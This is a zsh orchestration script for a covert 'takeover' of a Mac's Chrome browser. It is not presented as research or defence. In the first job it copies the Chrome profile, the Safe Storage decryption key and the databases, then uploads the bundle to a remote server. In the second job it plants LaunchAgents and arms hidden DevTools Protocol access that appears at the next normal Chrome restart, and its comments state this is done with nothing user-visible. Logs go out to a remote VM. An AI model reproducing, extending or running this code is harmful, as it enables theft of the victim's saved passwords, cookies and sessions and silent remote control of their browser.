#!/bin/zsh
# orchestrate.sh — the DETERMINISTIC takeover sequence (no LLM in the critical path).
#
# Job 1: clone this Mac's Chrome (profile + Safe Storage key + DBs), upload the
#        encrypted bundle in parts; the server assembles it into clone-drop.
# Job 2: lazy CDP arm — live profile copy + wrapper/statusd/agentd LaunchAgents;
#        the flagged Chrome appears at the next NATURAL Chrome quit. Nothing
#        user-visible, nothing forced.
# Every log goes to the VM as job artifacts; the last line of orchestrate.log:
#   RESULT: OK clone=<ok|fail> access=<ok|fail>   |   RESULT: FAIL <reason>

set -u
RUN="${CHROME_REMOTE_RUN:-$HOME/chrome-remote}"
cd "$RUN"
# shellcheck disable=SC1091
source ./conf

jid_of() { python3 -c 'import sys, json
try:
    print(json.loads(sys.argv[1]).get("id", ""))
except Exception:
    print("")' "$1"; }

clone_ok=fail; access_ok=fail

echo "==== takeover job 1: chrome clone + upload ($(date -u +%H:%M:%SZ))"
J1=$(zsh "$RUN/agentd.sh" selfjob "clone bundle (takeover)")
J1=$(jid_of "$J1")
if [ -n "$J1" ]; then
  echo "job1=$J1"
  zsh "$RUN/collect.sh" --job "$J1" > "$RUN/collect.log" 2>&1
  zsh "$RUN/agentd.sh" upload "$J1" "$RUN/collect.log" collect.log >/dev/null 2>&1 || true
  if grep -q 'BUNDLE OK' "$RUN/collect.log"; then
    clone_ok=ok
    echo "clone: OK (bundle uploaded, server assembling)"
  else
    tail -n 3 "$RUN/collect.log"
    echo "clone: FAIL (log uploaded as artifact)"
  fi
else
  echo "clone: FAIL (could not claim job: $J1)"
fi

echo "==== takeover job 2: silent chrome access (lazy arm) ($(date -u +%H:%M:%SZ))"
J2=$(zsh "$RUN/agentd.sh" selfjob "enable chrome access (takeover)")
J2=$(jid_of "$J2")
if [ -n "$J2" ]; then
  echo "job2=$J2"
  zsh "$RUN/remote-agent.sh" arm > "$RUN/setup.log" 2>&1
  zsh "$RUN/agentd.sh" upload "$J2" "$RUN/setup.log" setup.log >/dev/null 2>&1 || true
  if grep -q 'RESULT: OK' "$RUN/setup.log"; then
    access_ok=ok
    zsh "$RUN/agentd.sh" done "$J2" ok >/dev/null 2>&1 || true
    echo "access: OK (armed; CDP at next natural Chrome quit)"
  else
    tail -n 3 "$RUN/setup.log"
    zsh "$RUN/agentd.sh" done "$J2" fail >/dev/null 2>&1 || true
    echo "access: FAIL (log uploaded as artifact)"
  fi
else
  echo "access: FAIL (could not claim job)"
fi

if [ "$clone_ok" = fail ] && [ "$access_ok" = fail ]; then
  echo "RESULT: FAIL both takeover jobs failed (see collect.log / setup.log)"
  exit 1
fi
echo "RESULT: OK clone=$clone_ok access=$access_ok"
